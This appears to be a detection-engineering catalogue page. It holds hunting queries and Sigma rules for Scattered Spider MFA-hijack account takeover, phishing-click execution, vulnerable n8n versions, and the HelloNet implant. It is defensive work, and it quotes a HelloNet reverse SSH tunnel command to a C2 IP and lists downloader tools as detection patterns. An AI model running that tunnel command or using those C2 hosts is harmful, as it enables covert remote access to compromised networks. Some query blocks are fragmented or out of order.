Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Adversary MFA method registration within 1h of a password reset (Scattered Spider / ShinyHunters ATO) · [LLM] MFA device registered from an IP never seen for the user (attacker enrollment for persistence)
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Adversary MFA method registration within 1h of a password reset (Scattered Spider / ShinyHunters ATO) AIInstallation Medium
Hunts the Scattered Spider / ShinyHunters account-takeover sequence the article's remediation section names: a help-desk-driven or self-service password reset immediately followed by the actor registering their own MFA authentication method/device on the same account. Correlates Entra ID audit reset events with security-info registration events on the same target within a tight window. Rationale: Uses the exact identity-plane TTP the article and Google/Mandiant hardening guidance name ('verify identity on password resets, device enrollment, and MFA changes') and CISA AA23-320A documents for Scattered Spider: reset password then transfer/register MFA to an attacker device. Correlating Entra reset + security-info-registration on one target inside 1h is high-fidelity because the two rarely fire back-to-back for the same principal in normal ops. Sentinel version keys on the true target (TargetResources); Defender CloudAppEvents version keys on AccountObjectId, best-covering the self-service-reset variant. Cross-checked against: • https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a • https://cloud.google.com/blog/topics/threat-intelligence/expansion-shinyhunters-saas-data-theft • https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html
ATT&CKT1098.005 T1556.006 T1078.004
Data sourcesChange.All_Changes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate help-desk password reset where the user then genuinely re-enrolls Authenticator on a newly issued phone
  • New-hire onboarding: initial credential set followed by first-time MFA registration
  • User lost/replaced phone, IT reset password and user re-registered device same session
  • Scheduled password-expiry rotation followed by prompted re-registration of security info
  • Bulk migration to a new MFA method (e.g. org-wide passkey rollout) driving many resets+registrations
Suppression filter
| where ResetIp !in ("<corp-egress-ranges-managed-elsewhere>") == false  // prefer: exclude registrations whose RegIp is in your corporate egress CIDR and ResetActor is a verified helpdesk service account
Response runbook
1) Triage: pull the RegIp/ResetActor and check whether the reset was a verified, ticketed help-desk action; compare RegIp ASN/geo to the user's normal sign-in locations and confirm the newly registered method is one the user recognises. 2) Contain: if unverified, revoke the user's sessions/refresh tokens, remove the rogue authentication method, disable the account or force a verified re-registration, and block the RegIp. 3) Hunt: look for post-ATO activity on that principal — PowerShell/browser-driven mass downloads from SharePoint/OneDrive, new OAuth app consents, inbox-forwarding rules, and additional resets across other users from the same actor/IP.
let window = 1h;
let resets = CloudAppEvents
| where Timestamp > ago(14d)
| where ActionType has_any ("Reset user password","Change user password","Reset password")
| project ResetTime = Timestamp, AccountObjectId, AccountDisplayName, ResetIp = IPAddress, ResetAction = ActionType;
CloudAppEvents
| where Timestamp > ago(14d)
| where ActionType has_any ("registered security info","registered all required security info")
| join kind=inner resets on AccountObjectId
| where Timestamp between (ResetTime .. ResetTime + window)
| project ResetTime, RegTime = Timestamp,
          DeltaMin = datetime_diff('minute', Timestamp, ResetTime),
          AccountDisplayName, AccountObjectId, ResetAction, ResetIp, RegIp = IPAddress
| order by RegTime desc
let window = 1h;
let pwreset = AuditLogs
| where TimeGenerated > ago(14d)
| where OperationName in ("Reset password (by admin)","Reset user password","Change user password","Self-service password reset flow activity progress")
| where Result == "success"
| extend TargetId = tostring(TargetResources[0].id), TargetUpn = tostring(TargetResources[0].userPrincipalName)
| project ResetTime = TimeGenerated, ResetOp = OperationName, TargetId, TargetUpn,
          ResetActor = tostring(InitiatedBy.user.userPrincipalName), ResetIp = tostring(InitiatedBy.user.ipAddress);
AuditLogs
| where TimeGenerated > ago(14d)
| where OperationName in ("User registered security info","Admin registered security info","User registered all required security info","User started security info registration")
| where Result == "success"
| extend TargetId = tostring(TargetResources[0].id), TargetUpn = tostring(TargetResources[0].userPrincipalName)
| project RegTime = TimeGenerated, RegOp = OperationName, TargetId, TargetUpn,
          RegActor = tostring(InitiatedBy.user.userPrincipalName), RegIp = tostring(InitiatedBy.user.ipAddress)
| join kind=inner pwreset on TargetId
| where RegTime between (ResetTime .. ResetTime + window)
| project ResetTime, RegTime, DeltaMin = datetime_diff('minute', RegTime, ResetTime),
          TargetUpn, ResetOp, ResetActor, ResetIp, RegOp, RegActor, RegIp
| order by RegTime desc
source:azure.activeDirectory @evt.name:("User registered security info" OR "User registered all required security info" OR "Admin registered security info" OR "Reset user password" OR "Reset password (by admin)" OR "Change user password" OR "Self-service password reset flow activity progress")
CLOUD
sourcetype="o365:management:activity" Workload=AzureActiveDirectory (Operation="Reset user password" OR Operation="Change user password" OR Operation="Reset password (by admin)" OR Operation="Self-service password reset flow activity progress" OR Operation="User registered security info" OR Operation="User registered all required security info" OR Operation="Admin registered security info")
| eval target=coalesce(ObjectId,UserId)
| eval resetTime=if(match(Operation,"(?i)password"), _time, null())
| eval regTime=if(match(Operation,"(?i)registered security info"), _time, null())
| stats min(resetTime) as resetTime max(regTime) as regTime values(Operation) as ops values(ClientIP) as clientIPs by target
| where isnotnull(resetTime) AND isnotnull(regTime) AND regTime>=resetTime AND (regTime-resetTime)<=3600
| eval DeltaMin=round((regTime-resetTime)/60,1)
| convert ctime(resetTime) ctime(regTime)
| table target ops clientIPs resetTime regTime DeltaMin
| sort - regTime
MFA device registered from an IP never seen for the user (attacker enrollment for persistence) AIInstallation Medium
Hunts the attacker-device MFA enrollment step from the same campaign, pivoting on infrastructure novelty instead of reset timing: an Entra security-info registration whose source IP has never appeared in that user's successful sign-in history over the baseline window. Surfaces enrollment from actor-controlled infrastructure after vishing/credential-harvesting SSO theft. Rationale: Second, distinct pivot on the same Mandiant/CISA-confirmed step (actor 'registered their own device for MFA'): novelty of the registration source IP against 30 days of the user's own successful sign-ins. This catches enrollment from attacker infrastructure even when no password-reset event preceded it (pure credential-harvesting/vishing path), which the timing-based UC would miss. Datadog is event-scoped only because per-user IP baselining must live in a rule-level reference table. Cross-checked against: • https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a • https://cloud.google.com/blog/topics/threat-intelligence/expansion-shinyhunters-saas-data-theft • https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html
ATT&CKT1098.005 T1078.004
Data sourcesChange.All_Changes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate remote/travelling user enrolling a new authenticator from a hotel/mobile-carrier IP not in baseline
  • New employee's first MFA registration (no prior sign-in baseline exists for the account)
  • User on a personal/home network never used for corporate sign-in registering a backup method
  • Corporate VPN or ZTNA egress change putting registration behind a new public IP/ASN
  • Consultant/contractor whose device connects from a client-site network for the first time
Suppression filter
| where RegActor !endswith "$"  // and, if available, exclude RegIp within corporate egress CIDR reference set
Response runbook
1) Triage: geo/ASN-enrich RegIp and confirm whether it belongs to the user's known networks or a hosting/VPN/mobile provider inconsistent with their profile; verify the registered method with the user out-of-band. 2) Contain: if unverified, revoke sessions and refresh tokens, delete the rogue authentication method, require verified re-registration, and add RegIp to conditional-access block. 3) Hunt: check the same RegIp/ASN for registrations against other users, subsequent SaaS data access (SharePoint/OneDrive downloads, Okta/SSO app access), and new OAuth grants or mailbox rules on the affected account.
let lookback = 30d;

| where ErrorCode == 0

| where isnotempty(IPAddress) and isnotempty(AccountObjectId)

let baselineIPs = SigninLogs

AuditLogs

| where Result == "success"

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

Exposed n8n Enterprise vulnerable to cross-issuer token-exchange auth bypass (CVE-2026-59208) AIExploitation High
Surfaces hosts where Defender/TVM reports n8n affected by CVE-2026-59208 (the JWT sub-only / iss-ignored token-exchange identity-binding flaw) or the sibling Enterprise auth flaw CVE-2026-54305. Article-specific because it keys on the exact CVE IDs and the n8n Enterprise token-exchange / Dynamic-Credentials attack surface rather than a generic 'outdated software' rule. Rationale: Anchors on the two concrete CVE IDs the article names (CVE-2026-59208 primary, CVE-2026-54305 same Enterprise surface) plus the 'n8n' product string — no narrative-only guessing. Cross-checked the GitHub Advisory DB and CVE record which confirm the sub-only-vs-iss root cause and the 2.27.4/2.28.1 fix floor. Cross-checked against: • https://cve.threatint.eu/CVE/CVE-2026-59208 • https://github.com/n8n-io/n8n/security/advisories • https://github.com/advisories/GHSA-v4pr-fm98-w9pg
ATT&CKT1212 T1556
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • n8n instance running a vulnerable version but with token exchange disabled (N8N_TOKEN_EXCHANGE_TRUSTED_KEYS unset) — flagged by version but not actually exploitable per vendor scope
  • n8n Enterprise configured with only a single trusted issuer — the flaw requires two or more trusted issuers to be exploitable
  • Community/self-hosted n8n where token exchange (Enterprise-only preview) is not licensed or available
  • TVM CVE-to-software mapping lag: a freshly patched host still showing the CVE until the next TVM scan cycle
  • Vendor-virtual-patched instances behind a WAF/reverse proxy that blocks the token-exchange endpoint
Response runbook
1) Triage: Confirm the flagged host runs n8n Enterprise and whether token exchange is actually on — check for the N8N_TOKEN_EXCHANGE_TRUSTED_KEYS env var and the token-exchange preview flag, and count configured trusted issuers (two or more = exploitable). 2) Contain: If exploitable and immediate patching isn't possible, cut the trusted-issuer list back to a single issuer or disable token exchange entirely; otherwise upgrade to the newest stable build the deployment supports (>= 2.28.1; 2.30.6 was current on 2026-07-16). 3) Hunt: Review n8n auth/audit logs on the instance for token-exchange logins where one local account was reached via tokens bearing different iss values with a colliding sub, and check for unexpected Dynamic Credentials ownership/OAuth-token changes (CVE-2026-54305) on the same hosts.

n8n running below the CVE-2026-59208 patch floor (2.27.4 / 2.28.1) in software inventory AIExploitation Medium
Catches n8n installs whose version predates the fix even before the CVE is mapped into the TVM vulnerability KB — a real gap for npm/Docker self-hosted n8n that ships a new minor most weeks. Flags any build below 2.27.4 plus the specific vulnerable 2.28.0 build (fixed in 2.28.1), per the exact floors the article states. Rationale: Uses the exact patch floors the article specifies (fix landed in 2.27.4 and 2.28.1; 2.28.0 is vulnerable) parsed against inventory version strings, so it fires even when the vuln KB hasn't yet linked CVE-2026-59208 to the n8n package — the common case for npm/Docker self-hosted installs. Version floor corroborated against the n8n release notes and GitHub advisory. Cross-checked against: • https://docs.n8n.io/release-notes • https://cve.threatint.eu/CVE/CVE-2026-59208
ATT&CKT1212 T1556
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Vulnerable version present but token exchange disabled (N8N_TOKEN_EXCHANGE_TRUSTED_KEYS unset) — not exploitable per vendor scope
  • Single-trusted-issuer configurations, which the vendor states are unaffected
  • Non-Enterprise/community n8n where the token-exchange preview feature is unavailable
  • Pre-release/build-suffixed versions (e.g. '2.28.0-rc1') that skew the split()-based semver parse
  • Sentinel and Splunk fields left empty here because the provided Sentinel schema lacks DeviceTvmSoftwareInventory and there is no CIM software-inventory datamodel — use UC1's vuln-KB query on those platforms
Suppression filter
| where SoftwareVersion !contains "-"   // drop pre-release/build-suffixed builds that break semver parsing
Response runbook
1) Triage: Verify the reported SoftwareVersion is genuine (rule out RC/build suffixes) and confirm the instance is n8n Enterprise with token exchange enabled and more than one trusted issuer. 2) Contain: Upgrade to the newest stable build (>= 2.28.1) or, as an interim measure, reduce the trusted-issuer list to one issuer or disable token exchange. 3) Hunt: Pivot the confirmed vulnerable hosts into UC1 (CVE-KB view) and review n8n audit logs for cross-issuer token-exchange sign-ins and Dynamic Credentials ownership changes on the same instances.
DeviceTvmSoftwareInventory
| where Timestamp > ago(1d)
| where SoftwareName has "n8n" or SoftwareVendor has "n8n"
| extend Ver = split(SoftwareVersion, ".")
| extend Major = toint(Ver[0]), Minor = toint(Ver[1]), Patch = toint(Ver[2])
| extend Vulnerable = (Major < 2)
    or (Major == 2 and Minor < 27)
    or (Major == 2 and Minor == 27 and Patch < 4)   // everything below 2.27.4
    or (Major == 2 and Minor == 28 and Patch == 0)  // 2.28.0 shipped the bug; fixed in 2.28.1
| where Vulnerable
| project DeviceName, DeviceId, SoftwareVendor, SoftwareName, SoftwareVersion, OSPlatform, EndOfSupportStatus
| sort by DeviceName asc
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-59208", "CVE-2026-54305")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-59208", "CVE-2026-54305")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION

    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-59208", "CVE-2026-54305")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime

    where Vulnerabilities.signature IN ("CVE-2026-59208", "CVE-2026-54305")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`

HelloNet persistence: wtsapi32.dll sideload dropped into ViPNet Update System dir AIInstallation High
Hunts the HelloInjector persistence artifact: a wtsapi32.dll planted in C:\Program Files (x86)\InfoTeCS\VIPNet Update System so the auto-started itcsrvup64.exe sideloads it. The legitimate wtsapi32.dll ships only in System32/SysWOW64, so any copy in the ViPNet update directory is malicious. Rationale: Anchored on the exact malicious path (C:\Program Files (x86)\InfoTeCS\VIPNet Update System) and filename (wtsapi32.dll) named in the article. wtsapi32.dll is a genuine System32 DLL, so its presence in the ViPNet update folder is a near-zero-FP sideload indicator. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://securelist.com/new-backdoor-mimics-security-software-update/116246/ • https://cyberpress.org/new-malware-masquerades-as-networking-software-updates/
ATT&CKT1574.002 T1036.005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • InfoTeCS vendor pushing an updated ViPNet build that legitimately relocates a DLL (verify Authenticode signer = InfoTeCS)
  • Backup/restore or file-recovery tooling replaying an old snapshot into the folder
  • Security analyst copying the sample into the directory during IR reproduction
  • AV quarantine-then-restore cycle re-writing the file
Suppression filter
| where InitiatingProcessVersionInfoCompanyName != "OOO Infotecs" or isempty(InitiatingProcessVersionInfoCompanyName)
Response runbook
1) Triage: pull the SHA256 of the dropped wtsapi32.dll and check Authenticode signer — a valid InfoTeCS signature is benign; unsigned/self-signed = malicious. Compare hash to the article MD5s (e.g. 16c211c96735f2fae9361b89bd7a31bf). 2) Contain: isolate the host, kill itcsrvup64.exe, and quarantine the DLL before next reboot (it auto-loads at OS start). 3) Hunt: search the estate for the same file/path, then pivot to the injected svchost (netsvcs), tesh4RPC.txt log, and outbound to 5.39.253.206.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "wtsapi32.dll"
| where FolderPath has @"\InfoTeCS\VIPNet Update System"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "wtsapi32.dll"
| where TargetFilePath has @"\InfoTeCS\VIPNet Update System"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActorUsername, Hash
| order by TimeGenerated desc
title: ViPNet Update System DLL Sideload - wtsapi32.dll Drop
id: 7b2c9f14-3a6d-4c81-9e52-1f0a8c4d6b21
status: experimental
description: Detects HelloNet/HelloInjector planting wtsapi32.dll in the ViPNet update directory for DLL side-loading via itcsrvup64.exe
references:
  - https://securelist.com/tr/hellonet-vipnet/120700/
author: SOC Detection Engineering

  - attack.t1036.005

  category: file_event

level: high
source:windows.sysmon @EventID:11 @TargetFilename:*wtsapi32.dll (@TargetFilename:*InfoTeCS* OR @TargetFilename:*infotecs* OR @TargetFilename:*INFOTECS*)
#event_simpleName=FileWritten
| TargetFileName=/\\InfoTeCS\\VIPNet Update System\\wtsapi32\.dll$/i
| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.file_name="wtsapi32.dll" AND Filesystem.file_path="*\\InfoTeCS\\VIPNet Update System*" by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.process_guid | `drop_dm_object_name(Filesystem)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.file_name="wtsapi32.dll" AND Filesystem.file_path="*\\InfoTeCS\\VIPNet Update System*" by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.process_guid | `drop_dm_object_name(Filesystem)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
HelloInjector sideload execution: itcsrvup64.exe loads wtsapi32.dll from non-System32 path AIInstallation High
Detects the moment itcsrvup64.exe image-loads the malicious wtsapi32.dll from the ViPNet directory instead of the OS System32 copy — the execution half of the side-load that leads to svchost injection. Complements the file-drop rule by catching cases where the DLL was staged before telemetry was on. Rationale: Uses the specific loader (itcsrvup64.exe) and DLL (wtsapi32.dll) plus a System32/SysWOW64 path exclusion so only the article's malicious load path fires. Sentinel/Splunk/Falcon left empty: image-load telemetry has no clean CIM datamodel, ASIM table, or listed FDR event; expressed via Defender + Sysmon EID 7 (Sigma) only. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1574.002
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Genuine ViPNet build that legitimately bundles a private wtsapi32.dll next to itcsrvup64.exe (verify signer)
  • Application-virtualization/App-V layering that redirects System DLL loads to a package path
  • Analyst detonating the sample in a sandbox
Response runbook
1) Triage: hash the loaded wtsapi32.dll (SHA256) and confirm signer; correlate with any DeviceFileEvents drop from rule #1. 2) Contain: isolate host, terminate itcsrvup64.exe and the child svchost it injected. 3) Hunt: dump svchost.exe (netsvcs) memory for the plaintext payload, and check for C:\users\public\tesh4RPC.txt and listeners on 5003/5060.
DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "itcsrvup64.exe"
| where FileName =~ "wtsapi32.dll"
| where not(FolderPath startswith @"C:\Windows\System32") and not(FolderPath startswith @"C:\Windows\SysWOW64")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceImageLoadEvents
| where TimeGenerated > ago(30d)
| where InitiatingProcessFileName =~ "itcsrvup64.exe"
| where FileName =~ "wtsapi32.dll"
| where not(FolderPath startswith @"C:\Windows\System32") and not(FolderPath startswith @"C:\Windows\SysWOW64")
| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by TimeGenerated desc
title: itcsrvup64.exe Side-Loads wtsapi32.dll From Non-System Path

HelloProxy AFD interception artifact: tesh4RPC.txt log written to C:\Users\Public AICommand & Control High
Hunts the operational log file HelloProxy writes for every connection its AFD_RECV hook processes (C:\users\public\tesh4RPC.txt, 'threadid: <tid> pid=<pid>'). The filename is unique to this implant, making the file-write a very high-fidelity indicator of an active in-memory proxy. Rationale: tesh4RPC.txt in C:\users\public is a verbatim, implant-unique artifact from the article (HelloProxy's AFD_RECV handler log). No legitimate software writes this name, so a single hit is high-confidence C2 activity. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1090 T1005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst copying the IOC file into Public during reproduction
  • Threat-intel sync tool staging IOC samples in a shared folder
  • Backup restore of a previously infected profile
Response runbook
1) Triage: identify the writing process (InitiatingProcessFileName) — it should resolve to an injected svchost.exe; read the file to confirm the 'threadid: <tid> pid=<pid>' format. 2) Contain: isolate host, capture a full memory image of the svchost PID before killing it (payload is in-memory only), then quarantine. 3) Hunt: check listeners on ports 5003/5060, outbound to 5.39.253.206 / 176.32.34.135, and frontpage.exe SSH tunnels.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "tesh4RPC.txt"
| where FolderPath has @"\Users\Public"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessFolderPath
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "tesh4RPC.txt"
| where TargetFilePath has @"\Users\Public"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActorUsername
| order by TimeGenerated desc

HelloNet C2 egress to 5.39.253.206 / 176.32.34.135 AICommand & Control Medium
Detects any host communicating with the two HelloNet command-server IPs, including the SSH tunnel endpoint 5.39.253.206:3522 used to relay proxied traffic back to the attackers. Straight IOC-match network detection across endpoint and NDR telemetry. Rationale: Both IPs (5.39.253.206, 176.32.34.135) are pre-extracted IOCs corroborated by the Securelist report and independent write-ups as HelloNet C2; 5.39.253.206:3522 is the confirmed SSH tunnel endpoint. Direct IOC match = high confidence. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://www.kaspersky.ru/about/press-releases/novyj-bekdor-atakoval-desyatki-rossijskih-organizacij
ATT&CKT1571 T1090
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel/sandbox infrastructure deliberately connecting to the IOC IPs for research
  • Shared hosting reuse — if the VPS is later re-leased to a benign tenant (validate timestamp against campaign window May-Jul 2026)
  • Security scanner probing the IPs from a jump host
Response runbook
1) Triage: identify the initiating process — svchost.exe (injected) or frontpage.exe (renamed PuTTY) confirms HelloNet; a browser suggests unrelated/scanner traffic. 2) Contain: block both IPs at the perimeter, isolate the host, kill the tunnel process. 3) Hunt: pivot on the host for wtsapi32.dll sideload, tesh4RPC.txt, and listeners on 5003/5060; sweep proxy logs for other internal hosts talking to these IPs.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in ("5.39.253.206", "176.32.34.135")
| project Timestamp, DeviceName, RemoteIP, RemotePort, Protocol, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessAccountName
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr in ("5.39.253.206", "176.32.34.135")
| project TimeGenerated, SrcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, NetworkProtocol, DvcAction
| order by TimeGenerated desc

Renamed PuTTY reverse SSH tunnel to HelloNet C2 (frontpage.exe -R sftp@5.39.253.206) AICommand & Control High
Detects the HelloNet reverse-tunnel launch: a renamed PuTTY (frontpage.exe in C:\users\public\music) opening an SSH reverse tunnel (-R 8443:...:5003) to sftp@5.39.253.206 on port 3522. Anchored on the C2 user@host string and the -R reverse-forward flag so it catches the behaviour even if the binary is renamed again. Rationale: Verbatim from the article: 'C:\users\public\music\frontpage.exe -C -N -R 8443:[redacted]:5003 sftp@5.39.253.206 -P 3522'. The user@C2 string plus the -R reverse-forward flag is behaviourally unique; the frontpage.exe-in-Public\Music clause catches the masqueraded binary independently. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://cyberpress.org/new-malware-masquerades-as-networking-software-updates/
ATT&CKT1572 T1090 T1036.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A sysadmin legitimately named their own PuTTY 'frontpage.exe' (rare; validate the destination is not 5.39.253.206)
  • IT staff running authorised reverse tunnels to a jump host (destination will differ from the C2)
  • Analyst reproducing the command line in a lab
Response runbook
1) Triage: confirm destination = 5.39.253.206:3522 and forwarded local port 5003 (ties to HelloProxy listener). Recover the -pw argument for the attacker credential. 2) Contain: kill the process, block 5.39.253.206, isolate host, and rotate any exposed jump-host/service creds. 3) Hunt: enumerate all C:\Users\Public\Music binaries estate-wide and correlate with wtsapi32.dll sideload hosts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (ProcessCommandLine has "sftp@5.39.253.206" and ProcessCommandLine has "-R ")
   or (FolderPath has @"\Users\Public\Music" and FileName =~ "frontpage.exe")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where (CommandLine has "sftp@5.39.253.206" and CommandLine has "-R ") or (NewProcessName endswith @"\Users\Public\Music\frontpage.exe")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Injected svchost (netsvcs) listener on HelloProxy ports 5003/5060 AICommand & Control Medium
